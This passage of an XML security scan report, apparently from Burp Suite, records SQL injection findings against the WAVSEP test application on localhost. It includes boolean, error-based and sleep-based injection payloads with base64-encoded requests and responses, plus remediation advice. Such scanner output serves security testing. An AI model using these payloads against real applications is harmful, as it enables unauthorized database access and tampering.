U0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMEVycm9yL0Nhc2UwNi1JbmplY3Rpb25JblZpZXctTnVtZXJpYy1QZXJtaXNzaW9uQnlwYXNzLVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbklkPTE1NjMxMTI0OSUyMG9yJTIwODI1MyUzZDgyNTg=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjM5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiB0cmFuc2FjdGlvbnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWMtUGVybWlzc2lvbkJ5cGFzcy1XaXRoMjAwRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTUNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMEVycm9yL0Nhc2UwNi1JbmplY3Rpb25JblZpZXctTnVtZXJpYy1QZXJtaXNzaW9uQnlwYXNzLVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbklkPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjM5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiB0cmFuc2FjdGlvbnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>512603445211409408</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case07-InjectionInSearch-Numeric-UnionExploit-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case07-InjectionInSearch-Numeric-UnionExploit-With200Errors.jsp [msgId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgId</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the msgId parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payloads <b>69560365 or 6867=06867</b> and <b>99617102 or 1214=1223</b> were each submitted in the msgId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgId parameter. The application took <b>20015</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpYy1VbmlvbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDcNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMEVycm9yL0Nhc2UwNy1JbmplY3Rpb25JblNlYXJjaC1OdW1lcmljLVVuaW9uRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnSWQ9MSc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTIzDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjE5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJycnIGF0IGxpbmUgMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpYy1VbmlvbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDcNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMEVycm9yL0Nhc2UwNy1JbmplY3Rpb25JblNlYXJjaC1OdW1lcmljLVVuaW9uRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnSWQ9MTY5NTYwMzY1JTIwb3IlMjA2ODY3JTNkMDY4Njc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjQwIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MTUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEKPC9URD4KPFREPgpXZWxjb21lIHRvIHRoZSB3ZWIgc2l0ZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyCjwvVEQ+CjxURD4KUmVtZW1iZXIgdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CllvdXIgYWNjb3VudCBpcyBhYm91dCB0byBleHBpcmUKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpYy1VbmlvbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDcNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMEVycm9yL0Nhc2UwNy1JbmplY3Rpb25JblNlYXJjaC1OdW1lcmljLVVuaW9uRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnSWQ9MTk5NjE3MTAyJTIwb3IlMjAxMjE0JTNkMTIyMw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjQwIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpYy1VbmlvbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDcNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMEVycm9yL0Nhc2UwNy1JbmplY3Rpb25JblNlYXJjaC1OdW1lcmljLVVuaW9uRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnSWQ9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEp]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjM5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6136157376217999360</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case08-InjectionInCalc-Numeric-BooleanExploit-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case08-InjectionInCalc-Numeric-BooleanExploit-With200Errors.jsp [minBalanace parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
